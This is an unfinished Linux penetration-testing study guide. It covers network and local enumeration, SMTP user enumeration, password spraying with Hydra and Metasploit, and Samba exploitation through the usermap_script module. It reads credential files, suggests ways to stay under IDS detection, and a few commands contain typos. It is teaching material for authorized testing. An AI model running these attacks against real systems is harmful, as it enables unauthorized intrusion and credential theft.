---
description: >-
  Linux and other variants of UNIX make up a very large segment of the overall
  internet infrastructure (including Critical Infrastructure).
---

# ‚≠ê WIP - Linux Exploitation

{% hint style="danger" %}
**This document is still in progress...** 
{% endhint %}

## Information Gathering

Information gathering and enumeration phases of any penetration test are considered the most important.

It is the result of these phases of the engagement that lead us to identify vulnerabilities, misconfigurations and ultimately to exploitation.

### Remote Enumeration - Study Guide

Remote Enumeration is the process of gathering as much information as possible about a target system from across-the-network perspective using all of the tools we have at our disposal.

#### OS Fingerprinting Re-cap

As a typical first step in identifying the OS of a target, we can use `nmap`:

```bash
# --osscan-guess enables aggressive OS detection
nmap -O --osscan-guess <ip_address>

# Open ports that are ususally returned from a port scan can offer OS insights
nmap -v -sT -O <ip_address>
```

The remote enumeration phase often begins with port scans for both TCP and UDP ports against target system/s, including service version fingerprinting `-sV`  and can be accomplished with a `nmap` command:

```bash
nmap -v -sS -sU -sV -n 192.168.0.1/24
```

#### Enumerating NFS

One of these commonly found services is the Network File System protocol, which is a RPC-based file sharing protocol often found configured on Unix-like systems, is typically used to provide access to shared resources, and can be found listening on TCP and/or UDP port 2049. `nmap` can easily identify a system running NFS. Note that since NFS is an RPC-based service and relies on other RPC services \(as `mountd`\) it should be directly queried via the Portmapper service which is found on port TCP and/or UDP 111 when using `nmap` NSE scripts:

```bash
nmap -sT -sU -sV -p2049 <ip_address>
```

An administrator wishing to share files from an NFS server will configure what are known as "exports", which are the mechanism used by NFS in order to export directories, in other words, make entire directories available to other users over the network. Exports configured for any given NFS serve can usually be found in the `/etc/exports` file on a target host locally.

One common issue with NFS is that often administrators will configure exports with little attention to security and usually export directories in a manner that allows any host or IP address to connect, without any authentication and if you're luck, also provide write-access to directories. 

Once we've identified that a server is running NFS, the first thing we want to do is to query it with several `nmap` NS scripts \(`nfs-ls`, `nfs-showmount` and `nfs-stafts`\). We can find them with:

```bash
ls /usr/share/nmap/scripts/ | grep nfs

# now we can obtain results relevant to NFS:
nmap --script nfs-ls, nfs-showmount-nfs-statfs <ip_address>
```

Alternatively we can use the built-in `showmount` command with the `-e` or `--exports` switches to show any exports that would be available to us as well. However, we can see it won't return as much information as `nmap`:

```bash
showmount -e <ip_address>
```

Ideally, an administrator would want to explicitly define \(whitelist\) IP addresses or hosts that should be allowed to connect to the NFS server. Even in the case where our access is restricted due to an NFS whitelist configuration like the above, the output still gives us valuable information regarding which IP addresses or hosts can mount any available exports. In this scenario, that information would be useful in the case we can either spoof our IP address to match a whitelisted IP address or take control of a host which is allowed to connect.

Once we've gathered the relevant NFS server information and have confirmed a misconfiguration, we can attempt to mount the available exported directories. This can be accomplished by first creating a temporary directory as your mount point, and then the exported NFS directory can be mounted:

```bash
mkdir -p /mnt/home/bob
mount -t nfs <nfs_server_ip>:/home/bob /mnt/home/bob -o nolock
mount # just test 
cd /mnt/home/bob && ls -al
```

#### Enumerating Portmapper \(rpcbind\)

`Portmapper` \(or rpcbind\) is another common service found on a Linux-based systems and is used to essentially "map" RPC or "ONC RPC" \(Open Network Computing Remote Procedure Call\) services to their corresponding TCP or UDP ports on a target system.

Information gleaned from the portmap service can offer insight regarding ports that are listening on a machine, but that may not necessarily be accessible over the network. A target system may be running a custom RPC service that is only accessible from the local host or may be running NFS, but only accessible from the local network, etc. Knowing this information can give us more insight to local services that may be running which could help us in further exploiting a system if and when local access has been obtained. `Portmapper` is typically found listening on ports TCP/UDP 111 and in some cases ports TCP/UDP 32771 and can be enumerated using `nmap` NSE scripts, or by using the built-in `rpcinfo` command.

Querying a single port \(TCP/111\) essentially enumerates all related RPC-related service ports without us having to conduct a port scan against all those ports individually. Furthermore, ii gives us knowledge of which ports the system has open locally \(bound to localhost\), which we couldn't normally identify with a usual port scan.

`nmap`'s `rpcinfo` and `rpc-grind` NSE scripts can be used to enumerate the Portmapper and associated RPC services:

```bash
nmap --script rpc-grind,rpcinfo <ip_address> -p 111

# the stand-alone rpcinfo command can also give similar results
rpcinfo -p <ip_address>
```

#### SMB \(Samba\)

It's a Linux-based implementation of the SMB/CIFS protocols, provides a print and file sharing services for Windows clients within an environment. Recent versions can also seamlessly be integrated with Active Directory domains. Samba can offer us a great bit of information when enumerated properly. 

Depending on the configuration, we can obtain OS version, user accounts on the system, file shares, their permissions and potentially sensitive data, and, depending on its integration with Active Directory, can be used to enumerate much more information. Improperly configured Samba servers can also lead to remote code execution among other things.

| Service | Port |
| :--- | :--- |
| netbios-ns \(Name Service\) | 137/tcp, 137/udp |
| netbios-dgm \(Datagram Service\) | 138/tcp, 138/udp |
| netbios-ssn \(Session Service\) | 139/tcp, 139/udp |
| microsoft-ds \(Naked CIFS\) | 445/tcp |

Samba can be trivially identified with a version scan against the NetBIOS ports:

```bash
nmap -sT -sU -sV <ip_address> -p136,137,138,139,445 --open
```

There are several smb-related NSE scripts to get an idea of shares that available on the target. We can use:

```bash
nmap --script smb-enum-shares <ip_address>
```

Alternatively we can also use `smbclient` to obtain similar info about shares, including Workgroup and NetBIOS name. Simply hitting 'enter; at the authentication prompt to obtain results also confirms that anonymous or guest access to the Samba server is enabled:

```bash
smbclient -L <ip_address>
```

In addition to simply listing shares which we have access to, we also want to know what type of access we have to which shares \(read only, write, etc\) with `smbmap`:

```bash
smbmap -H <ip_address>
```

Once we've identified shares, we have several options for interacting with them:

```bash
smbclient \\\\<ip_address>\\<share_name>

# or

mkdir /mnt/folder
# apt install cifs-utils
mount -t cifs \\\\<ip_address>\\<share_name> /mnt/folder
cd /mnt/folder && ls -las
```

#### SMB Users

Enumerating users when it comes to Samba or over SMB can be accomplished in several ways. 

**Method \#1: bash "for loop" and rpcclient**

Using `rpcclient` and list of potential usernames we've gather from other phases of information gathering:

```bash
for u in $(cat users.txt)
do
    rpcclient -U "" <ip_address> -N --command="lookupnames $u"
done
grep "User: 1"
```

There are several options available with `rpcclient`. Some useful commands include `loopupsids`, `netshareenum`, `srvinfo` and `enumprivs`.

**Method \#2: Automated \(enum4linux\)**

It can be used to enumerate the following:

* Operating system
* Users
* Password Policies
* Group Membership
* Shares
* Domain/Workgroup Identification

```bash
enum4linux <ip_addess>
```

#### Enumerating SMTP Users

You're probably familiar with the `HELO`, `RCPT` or `MAIL` verbs if you've ever sent an email while directly connected to an email server via `telnet` or some other way.

The following information does apply for both Windows and Linux-based mail servers since SMTP is the underlying protocol, but since a large majority of mail servers in-use are Linux-based, we'll be focusing on enumerating users from `sendmail`. If the wild, you'll mostly encounter `sendmail`, `postfix`, `exim` or Microsoft Exchange.

Similar to the user enumeration process for SMB users, there are several ways to accomplish this task either using manual methods or using tools designed for the purpose of enumerating users form a mail server.

The first task is to enumerate which options, verbs or features are enabled on an SMTP server, usually found on TCP/25:

```bash
nmap --script smtp-commands <ip_address> -p 25

# or

nc <ip_address>

# or 

telnet <ip_address>
```

We are interested in: `RCPT`, `VRFY` and `EXPN`.

Using `RCPT TO`, we can enumerate users via direct connection to the mail server with either `telnet` or `nc`. 

```bash
telnet <ip_address>
HELO
MAIL FROM
```

Valid users will return a Status code of `250 2.1.5` while a `550 5.1.1` status code and `User unknown` message denotes a non-existent user.

Another feature we can use to enumerate users in the `EXPN` feature, which was designed to be used to query a mail server for a list of members within a mailing list on a server. 

The typical command would be `EXPN mailing-list-name` or `EXPN username`.

Valid users will return a Status Code of `250 2.1.5` while `550 5.1.1` status code and `User unknown` message denotes a non-existent user.

Lastly the `VRFY` request can also be used an is more common than the `EXPN` method. The same command line can be used with `VRFY` and the results are similar to the `EXPN` output. Same status codes are used.

`smtp-user-enum` is a great tool that automates the user enumeration process for SMTP. `smtp-user-enum` tests all three methods, `RCPT`, `EXPN` and `VRFY` against a list of users:

```bash
smtpuser-enum -M VRFY -U users.txt -t <ip_address>
smtpuser-enum -M EXPN -U admin1 -t <ip_address>
smtpuser-enum -M RCPT -D users.txt -T mail-server.ips.txt
smtpuser-enum -M EXPN -D example.com -U users.txt -t <ip_address>
```

{% embed url="https://github.com/CiscoCXSecurity/enum4linux" %}

{% embed url="https://en.wikipedia.org/wiki/Network\_File\_System" %}

{% embed url="https://en.wikipedia.org/wiki/Open\_Network\_Computing\_Remote\_Procedure\_Call" %}

{% embed url="https://en.wikipedia.org/wiki/Portmap" %}

{% embed url="https://en.wikipedia.org/wiki/Samba\_\(software\)" %}

{% embed url="https://www.proofpoint.com/us/products/email-protection/open-source-email-solution" %}

{% embed url="https://en.wikipedia.org/wiki/Server\_Message\_Block" %}

{% embed url="https://github.com/ShawnDEvans/smbmap" %}

{% embed url="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" %}

{% embed url="https://github.com/insidetrust/statistically-likely-usernames" %}

{% embed url="https://cr.yp.to/smtp/mail.html" %}

{% embed url="https://cr.yp.to/smtp/vrfy.html" %}

### Local Enumeration - Study Guide

We go for local enumeration once we've obtained access to a Linux machine.

* either as a low privileged or high privileged user
* via a shell
* through a web application

... with the ultimate goal of obtaining higher-level access to our current machine and access to other machines within an environment as a result of information obtained from our exploited host.

#### Network Information

We can ask ourselves some important questions:

* How is the exploited machined connected to the network?
* Is the machine multi-homed? Can we pivot to other hosts in other segments?
* Do we have unfettered outbound connectivity to the internet or is egress traffic limited to certain ports or protocols?
* Is there a firewall between me and the other devices/machines?
* Is the machine I'm on communicating with other hosts? If so, what is the purpose or function of the hosts that my current machine is communicating with?
* What protocols are being used that are originating from my actively exploited machine? Are we initiating FTP connections or other connections \(ssh, etc\) to other machines?
* Are other machines initiating a connection with me? if so, can that traffic be intercepted or sniffed as cleartext in transit? Is it encrypted?

**Ifconfig**

Used to get information regarding our current network itnerfaces. We want to know what our IP address is, and whether or not there are additional interfaces that we may be able to use as pivots to other network segments.

```bash
ifconfig -a
```

**route**

Used to print our current network routes, which includes our gateway. Knowing what our static routes and gateway are can help us in case we need to manually configure our network interfaces, pivot to other network segments or will come in handy if we decide to execute ARP-poisoning or other MITM attacks.

```bash
route -n
```

**traceroute**

Sometimes we'll want to know how many hops there are between our compromised machine and other network segments:

```bash
traceroute -n <ip_address>
```

**DNS Information**

* What machine is resolving our DNS queries?
* Can we use it to exfiltrate data over a DNS tunnel?
* Is the DNS server vulnerable to any exploits?
* Is it an Active Directory controller?

```bash
cat /etc/resolv.conf
```

**ARP Cache**

The systems' ARP cache can be used to give us a bit of situational awareness regarding machines near us, or machines that our currently exploited system communicates with for one reason or another. This information is useful when it comes down to determining who we're communicating with, what's being communicated and whether that traffic or communication has any value to us from an exploitation perspective, like credentials transmitted in cleartext:

```bash
arp -en
```

**netstat**

Gives us insight regarding:

* What other machines or devices we are currently connected to.
* Which ports or services on other machines we are connected to.
* What ports our current machine are listening on.
* Are there other systems establishing connections with our current machine.

We can list all TCP and UDP connections to other systems and listening services with:

```bash
netstat -auntp
```

In the rare case you're on a very restricted system, the netstat command is missing, you can get similar information from the `/proc/net/tcp` and `/proc/net/udp` files.

**ss**

An alternative to `netstat` that we can use to list active networks connections.

```bash
ss -twurp
```

Gives another perspective on established connections, bytes being transferred, and the processes/users responsible for the connections.

**Outbound Port Connectivity**

Another thing we want to check is whether or not our outbound port connectivity is restricted in any way.

Knowing this information will be useful if we need to establish outbound connections to other systems we control for the purpose of maintaining access or exfiltrating data.

A quick way we can check outbound port connectivity status is with `portquiz.net`, which is a web server which has most TCP ports listening. We can use it to confirm we can connect to arbitrary ports outside of our network with a quick `nmap` scan:

```bash
nmap -sT -p4444-4450 portquiz.net
```

Keep in mind that any scans originating from your compromised machine can alert network administrators of anomalous activity. Consider using nmap's `--T` \(timing\) option at a low value to stay under any internal IDS radar.

**Network Information Commands**

```bash
cat /etc/resolv.conf            # DNS Server
ifconfig -a                     # list current network interface configuration
route                           # current network route information
traceroute -n <ip_address>      # trace our route accross network segments
arp -a                          # list our ARP cache
netstat -auntp                  # established and listening TCP/UDP ports/connections
ss -twurp                       # listing active connections, processes, users and bytes
nmap -sT -p5555 portquiz.net    # check outbound firewall rules
```

#### System Information

The System Information gathering phase is much like the Network Information phase, except we're getting much more data. Our goal with this phase is to get information regarding:

* OS and Kernel
* Env Variables
* Interesting Files and Sensitive Information
* Users, Groups, Permissions and Privileges
* Services and Associated Configuration Files
* Cron Jobs, System Tasks
* Installed Applications and Versions
* Running Processes

Our ultimate objective from this portion of the testing is to elevate our privileges once we've obtained access to a system or systems and obtain additional footholds within an environment as a result of the information we obtain.

```bash
id                    # current user information
uname -a              # kernel version
grep $USER /etc/passwd # Current User Information from /etc/passwd
lastlog               # most recent logins
w                     # who is currently logged onto the system
last                  # last logged on users

# all users including UID and GID information
for user in $(cat /etc/passwd | cut -f1 -d":"); do id $user;done

# List all UID 0 (root) accounts
cat /etc/passwd | cut -f1,3,4 -d":" | grep "0:0" | cut 0f1 0d":" | awk '{print $1}'

cat /etc/passwd       # Read passwd file
cat /etc/shadow       # check readibility of the shadow file
sudo -l               # what can we sudo without a password
cat /etc/sudoers      # can we read /etc/sudoers file?
cat /root/.bash_history # can we read roots .bash_history files?
cat /etc/issue        # OS
cat /etc/*-release    # OS

# can we sudo known binaries that allow breaking out into a shell?
sudo -l | grep vim
sudo -l | grep nmap
sudo -l | grep vi

ls -als /root/        # can we list root's home directory?
echo $PATH            # current $PATH env variable
cat /etc/crontab && ls -als /etc/cron*    # list all cron jobs
find /etc/cron* -type f -perm -o+w -exec ls -l {} \; # find world-writeable cron jobs
ps auxwww             # list running processes
ps -u root            # list all processes running as root
ps -u $USER           # list all processes running as current user
find / -perm -4000 -type f 2>/dev/null    # Find SUID files
find / -uid 0 -perm -4000 -type f 2>/dev/null    # Find SUID files owned by root
find / -perm -2000 0type -f 2>/dev/null          # Find GUID files
find -perm -2 -type f 2>/dev/null                # Find wolrd-writable files
ls -al /etc/*.conf                               # list all conf files in /etc/
grep pass* /etc/*.conf    # Find conf files that contain the string "pass*"
lsof -n                   # list open files
dpkg -l                   # list installed packages (debian)

# Common software versions
sudo -V 
httpd -v
apache2 -v
mysql -V
sendmail -d0.1

# print process binaries/paths and permissions
ps aux | awk '{print $11}' | xargs -r ls -la 2>/dev/null |awk '!x[$0]++'
```

#### LinEnum

Automatic Information Gathering Tool which takes care of a lot of that process.

#### LinuxPrivChecker

Privilege escalation method finder.

#### unix-privesc-check

Script for finding common misconfigurations which can help us elevate our privileges on a Linux-based system.

#### mimipenguin

Tool we can use for dumping the logon password for the currently logged on user, this should be done during the post-exploitation phase.

{% embed url="https://web.archive.org/web/20200218150604/https:/www.rebootuser.com/?p=1623" %}

{% embed url="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" %}

{% embed url="https://github.com/FuzzySecurity/Unix-PrivEsc" %}

{% embed url="https://github.com/rebootuser/LinEnum" %}

{% embed url="https://github.com/sleventyeleven/linuxprivchecker" %}

{% embed url="https://github.com/huntergregal/mimipenguin" %}

{% embed url="https://staaldraad.github.io/2017/12/20/netstat-without-netstat/" %}

{% embed url="http://portquiz.net/" %}

{% embed url="https://github.com/FuzzySecurity/Unix-PrivEsc" %}

{% embed url="http://pentestmonkey.net/tools/audit/unix-privesc-check" %}

### ‚ñ∂ Information Gathering

### üß™Linux Exploitation: Lab 1 - Remote Enumeration

### üß™Linux Exploitation: Lab 2 - Local Enumeration

## Exploitation over the Network

### Remote Exploitation Introduction - Study Guide

Once we've identified vulnerabilities or misconfigurations as  a result of the Information Gathering phase, the next logical step is to continue our enumeration and move into exploitation phase.

### Password Spray Attack / Reverse Brute-Force attack

Rather than the usual dictionary brute force methods involving a dictionary of hundreds if not millions of password entries, the idea is to reverse the process and instead, introduce a list of as many users as possible, while trying just a single password attempt against tens or hundreds of user accounts.

This method reduces the potential for accounts lockouts and in some cases, allows us to stay "under the radar" when attempting single passwords against many users. To successfully execute a password spray attack, we must first gather as many usernames as possible in regard to our target organization or target system. 

We can use tools such as `theHarvester` to get an idea of user naming conventions organizations are using for their users. Utilizing more than one tool to help compile an initial user list will only help us in our quest.

For enumerating SMTP users: `smtp-user-enum` and also several manual methods as `VRFY`,`EXPN`Metasploit also contains an auxiliary scanner module known as `smpt_enum`.

First we'll need to create our initial user list. We can quickly create a list of 50 users with the following command, where `john.txt` is taken directly from the `Statiscally Likely Usernames` list:

```bash
head -n john.txt >> users.txt
```

Once we've created our initial list of users, combined with users we've gathered from other phases of testing, we can execute our user enumeration process using the Metasploit `smtp_enum` module against our target SMTP server:

```bash
msf > use auxiliary/scanner/smtp/smtp_enum
msf > set RHOSTS <ip_address>
msf > set USER_FILE users.txt
msf > run
```

When the scanner completes \(which may take several minutes depending on how many users are in our list\), we can se e that we've validated several users that we can use for our password spray attack. We can now create a list of validates users. Add those to your `valid_users.txt` file, \(one on each line\) with any others you m ay have validated during information gathering. 

The more users we can validate, the higher the probability that our password spray attack will succeed; so aim to create as large a list as possible, of validated user accounts.

Now that we have validated some users, we should determine one \(recommended\) or two \(maximum\) commonly-used passwords we can use for our attack.

Regarding commonly used passwords, real-world experience has shown that one of the most commonly used passwords are usually found to be the current season, along with the current year, e.g., Spring2018.

You'll be surprised at how many times you will come across multiple users, within the same environment, using the same exact password in the "Season\[Year\]" format. Use this lack of configuration of password complexity and human nature to choose easy-to-remember passwords to your advantage. 

Another very common password "CompanyName" along with a numerical value, e.g., `FooCorp01` , `FooCorp02` , etc.

For our password list, we'll start with just using `Spring2018` as it's very common. Use your imagination when picking a password that relates to your target in some way or another.

In environments where password complexity is not enabled \(a common observation in Linux-based networks\), users will take advantage of using easy-to-remember passwords that they'll modify by simply changing a value or other characteristic over time \(as `Password01` to `Password02` or `Summer2018` to `Fall2018` etc\).

From month to month, season to season, making minor modifications to their passwords will be enough to please the systems' passwords policy.

Now that we have a list of users we've validated, and a list containing two very common passwords, we can start our password spray attack against other services on our target machine. 

Also keep in mind that password re-use is also a frequent issue and passwords may be reused across systems within an environment. 

First let's determine some other services that are listening on our target system that we can execute a password spray attack against using `nmap` : 

```bash
nmap -sT <ip_address> --open -max-retries 1 -n
```

Now that we have determined that there are several services we can execute our password spray attack against; `ssh`, `smtp` and `smb` as they utilize some form of authentication or another. 

We'll use `ssh` just to demonstrate that we can use one particular service \(as `SMTP` \) to enumerate for valid users that we can then use to attack an unrelated service, as `ssh`.

**To summarize:**

1. We've created a list of users gathered through our information gathering phase, in addition to using usernames from `Statistically Likely Usernames` list. 
2. We've confirmed valid users using SMTP user enumeration with the `smtp_enum` Metasploit scanner module.
3. We've created our list of validated user accounts, and a list containing two commonly-used passwords.
4. We've determined several services on our target machine we can execute our password spray attack against and have decided on `ssh`.

Now that all those pieces are in place, we can execute our password spray attack against the SSH service.  `THC-Hydra` is a well-known and tested brute-force tool.

Withy `hydra` we can supply our list of users \(`-L`\), our password list \(`-P`\) and specify the service we'd like to attack `ssh`, with a command line similar to the following:

```bash
hydra -L users.txt -P passwords.txt ssh://<ip_address>
```

Once we've obtained valid credentials for a single user, we can also exploit the common case of "password reuse" within an environment.

Using the obtained credentials, we can then use those to attempt to log in to other SSH-enabled machines as our user. This often results in access to multiple systems  which can then later be used as pivots to other areas of the network or to maintain multiple footholds, etc.

Of course, this can also be done with Hydra, and in a single sweep we can determine other systems on the network, which allow access using the same credentials we've cracked. We would use the `-M` parameter to specify a list of `ssh` servers. Something like the following:

```bash
hydra -l david -p Spring2018 -M ssh_servers.txt ssh
```

Where `ssh_servers.txt` is a file containing your `ssh` target servers, one per line.

In addition to trying your password spray attack against the `ssh` service we encourage you to also experiment with brute forcing `SMB` or any other listening services that accept user credentials if found as well. 

Metasploit's `smb_login` scanner module can be used to obtain similar results for password spray attacks against SMB services.

Aside from targeting Linux-based systems with password spray attacks, the same concept is, of course, valid for any type of environment or platform, as long as the service provides a means to authenticate to it.

With that said, password spray attacks are also known to be very successful against platforms such as Outlook Web Access or Exchange Portals.

Try this attack using Metasploit's `owa_login` brute-force module on OWA portals you are authorized to test against for great results using the Password Spray method.

**A Word of Caution Regarding Password Spraying**

Depending on system configurations, Password Spray Attacks can be detected and thwarted, which is why it is crucial to only attempt one \(recommended\) to two \(maximum\) passwords during a single run.

Take extra care that whichever tool you're using isn't trying blank passwords or other variations in addition to whatever is in your password list. 

This would add the authentication attempts and likely result in account lockouts or detection by a SIEM or other anomalous event detection solution.

Furthermore, after attempting a password spray attack run, fi unsuccessful the first time around, wait 45 minutes and try again with new passwords in your list.

Multiple attempts within a certain time-range can also result in detection and/or lockouts.

{% embed url="https://www.rapid7.com/db/modules/auxiliary/scanner/http/owa\_login/" %}

{% embed url="https://en.wikipedia.org/wiki/Brute-force\_attack\#Reverse\_brute-force\_attack" %}

{% embed url="https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb\_login/" %}

{% embed url="http://pentestmonkey.net/tools/user-enumeration/smtp-user-enum" %}

{% embed url="https://github.com/insidetrust/statistically-likely-usernames" %}

{% embed url="https://github.com/vanhauser-thc/thc-hydra" %}

{% embed url="https://github.com/laramies/theHarvester" %}

### Exploiting Samba - Study Guide

Samba is quite commonly found within Linux-based environments, as it typically provides file sharing services to both Windows and Linux users.

It's also a ripe target when configured incorrectly, and version **up to 4.6.4**, contain vulnerabilities that allow an attacker to take control of an affected server completely. This was most recently seen with **CVI-2017-7494** sometimes referred to as _SambaCry_. 

It will be important that we identify the exact versions of Samba, as well as identify vulnerabilities that exist in either the versions or configurations, and then exploitation of the systems.

The first task requires identifying that Samba is installed on the system and furthermore, identifying the version of Samba; this can be accomplished with a nmap `smb-os-discovery` script scan for port 445:

```bash
nmap --script smb-os-discovery -p445 <ip_address>
```

Once the version of Samba is known, we can start to investigate exactly which vulneratiblities might be present for that particular version. 

`searchsploit` is an excellent tool for this and allows us to search all vulnerabilities for a particular software directly from the Linux command line. `searchsploit` is a local database of all exploits that can also be found online \(www.exploit-db.com\)

```bash
searchsploit samba 3.0.20
```

From its results we can see that we have potential vulnerability candidate. We optionally have a Metasploit module indicator as well.

#### Username Map Script: CVE-2007-2447

This vulnerability was discovered in 2007 by an anonymous researcher and affects Samba versions 3.0.0 through 3.0.25rc3 and exists in non-default configurations where the "username map script" option is enabled, which results in remote command execution and compromise of the affected server.

```bash
msf> use exploit/multi/samba/usermap_script
msf> set RHOST <ip_address>
msf> set LHOST <ip_address>
msf> exploit
```

Once the exploit is completed, we have a command Shell Session we can immediately start interacting with.

In order to have a proper Pseudo TTY:

```text
python -c 'import pty; pty.spawn("/bin/sh");'
```

#### Samba Symlink Directory Transversal

Another vulnerability which is a result of a particular misconfiguration in Samba but with sometimes catastrophic consequences. This vulnerability essentially allows an attacker to create a symbolic link to the root partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory. 

Although this vulnerability can be exploited using `smbclient`, Metasploit contains a module for exploitation:

A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the `widelinks` parameter in the `smb.conf` file is set with a value of `yes`. We can use the following `smbmap` command to determine shares available to us on a Samba server, in addition to determining whether or not we have read or write permissions to a given share:

```bash
smbmap -H <ip_address>
```

Once we've determined a writeable share is available, we can use Metasploit's `samba_symlink_traversal` auxiliary module to create the symlink to the root filesystem. 





























































### Exploiting Shellshock - Study Guide

### Exploiting Heartbleed - Study Guide

### Exploiting Java RMI Registry - Study Guide

### Exploiting Java Deserialization - Study Guide

### Exploiting Tomcat - Study Guide

### ‚ñ∂ Remote Exploitation

## Post Exploitation

### Post Exploitation Introduction - Study Guide

### Privilege Escalation - Study Guide

### Lateral Movement - Study Guide

### Data Exfiltration - Study Guide

### Maintaining Access - Study Guide

### ‚ñ∂ Post-Exploitation and Lateral Movement

### üß™ Linux Exploitation: Lab 3 - Remote Exploitation and Post Exploitation

### üß™ Linux Exploitation: Lab 4 - Lateral Movement

